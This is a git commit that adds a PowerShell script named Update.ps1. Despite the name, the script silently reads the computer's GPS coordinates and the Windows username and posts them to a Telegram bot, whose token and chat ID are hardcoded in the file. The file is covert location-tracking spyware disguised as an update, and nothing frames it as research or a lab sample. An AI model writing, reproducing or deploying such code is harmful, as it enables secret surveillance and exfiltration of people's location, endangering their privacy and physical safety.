397908ea45eda8db7e27ab6263b5424a1005a15c
Gaxi261 <127938084+Gaxi261@users.noreply.github.com>
2025-03-21 14:40:24 +1100

    Create Update.ps1

---
+++ Update.ps1
@@ -0,0 +1,41 @@
+$botToken = '7428812431:AAFz3Mo7Ow9pS8bCBzAlVpvnrYZAQikk0w0'
+$chatId = '-4775569449'
+
+# Load System.Device assembly
+Add-Type -AssemblyName System.Device
+
+# Create a GeoCoordinateWatcher object
+$watcher = New-Object System.Device.Location.GeoCoordinateWatcher
+
+# Start the watcher
+$watcher.Start()
+
+# Wait for the position to be determined (you can adjust the timeout as needed)
+$timeout = 10
+while (($watcher.Status -ne 'Ready') -and ($timeout -gt 0)) {
+    Start-Sleep -Seconds 1
+    $timeout--
+}
+
+# Check if the watcher is ready
+if ($watcher.Status -eq 'Ready') {
+    # Get the current position
+    $position = $watcher.Position.Location
+    $username = $env:USERNAME
+    $textMessage = "Online | Username: $username | Latitude: $($position.Latitude), Longitude: $($position.Longitude)"
+} else {
+    $textMessage = "Failed to determine the GPS location."
+}
+
+# Stop the watcher
+$watcher.Stop()
+
+# Send message to Telegram
+$apiUrl = "https://api.telegram.org/bot$botToken/sendMessage"
+$params = @{
+    'chat_id'    = $chatId
+    'text'       = $textMessage
+}
+$jsonParams = $params | ConvertTo-Json
+$response = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $jsonParams -ContentType 'application/json'
+Write-Output $response
